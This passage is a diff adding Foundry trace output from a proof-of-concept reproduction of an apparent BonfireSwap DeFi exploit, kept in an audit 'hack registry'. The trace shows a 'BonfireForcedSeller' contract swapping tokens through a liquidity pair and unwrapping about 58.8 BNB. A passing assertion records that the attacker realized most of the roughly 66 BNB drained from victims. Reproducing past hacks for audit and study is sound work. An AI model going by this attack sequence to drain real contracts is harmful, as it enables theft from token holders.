+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 414113561987228508752931 [4.141e23]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5833013269279393305176 [5.833e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000005749f8978d6136cfc1ff00000000000000000000000000000000000000000000013c355207c7e22dd258000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [2082] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmounts(414113561987228508752931 [4.141e23], 5833013269279393305176 [5.833e21], 412210409268531491226111 [4.122e23], 5833013269279393305176 [5.833e21], 2) [staticcall]
+    │   │   │   ├─ [1239] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmounts(414113561987228508752931 [4.141e23], 5833013269279393305176 [5.833e21], 412210409268531491226111 [4.122e23], 5833013269279393305176 [5.833e21], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017346e3370b43c6ca
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017346e3370b43c6ca
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [38327] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(0, 26753320461992707786 [2.675e19], 0x17e801E17CeFC6334059189c178D4783830E03D3, 0x)
+    │   │   │   ├─ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x17e801E17CeFC6334059189c178D4783830E03D3, 26753320461992707786 [2.675e19])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 26753320461992707786 [2.675e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xaa69c5c9adc5493731f0b4241589ddbda7c362ecbb172acf617ee5e0bd2f1d76: 0 → 0x0000000000000000000000000000000000000000000000017346e3370b43c6ca
+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x00000000000000000000000000000000000000000000013c355207c7e22dd258 → 0x00000000000000000000000000000000000000000000013ac20b2490d6ea0b8e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 414113561987228508752931 [4.141e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5806259948817400597390 [5.806e21]
+    │   │   │   ├─ emit Sync(reserve0: 414113561987228508752931 [4.141e23], reserve1: 5806259948817400597390 [5.806e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 1903152718697017526820 [1.903e21], amount1In: 0, amount0Out: 0, amount1Out: 26753320461992707786 [2.675e19], to: 0x17e801E17CeFC6334059189c178D4783830E03D3)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa90cb400000000013c355207c7e22dd258000000005749f8978d6136cfc1ff → 0x6aa90cb400000000013ac20b2490d6ea0b8e0000000057b124243fb30d760c23
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   │   │   └─ ← [Return] 26753320461992707786 [2.675e19]
+    │   │   ├─ [9195] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(26753320461992707786 [2.675e19])
+    │   │   │   ├─ [55] 0x17e801E17CeFC6334059189c178D4783830E03D3::fallback{value: 26753320461992707786}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Withdrawal(src: 0x17e801E17CeFC6334059189c178D4783830E03D3, wad: 26753320461992707786 [2.675e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xaa69c5c9adc5493731f0b4241589ddbda7c362ecbb172acf617ee5e0bd2f1d76: 0x0000000000000000000000000000000000000000000000017346e3370b43c6ca → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [55] BonfireForcedSeller::receive{value: 26753320461992707786}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017346e3370b43c6ca
+    │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 58780939117409582177 [5.878e19]
+    ├─ emit log_named_decimal_uint(key: "BNB extracted (5-victim subset ~98.7% of drain)", val: 58780939117409582177 [5.878e19], decimals: 18)
+    ├─ [0] VM::assertGt(58780939117409582177 [5.878e19], 40000000000000000000 [4e19], "attacker realized the bulk of the ~66 BNB") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 33.73ms (21.59ms CPU time)
+
+Ran 1 test suite in 966.07ms (33.73ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/Users/alex/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71:  8438 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /Users/alex/RustroverProjects/audits/evm-hack-registry/2026-09-BonfireSwap_exp)
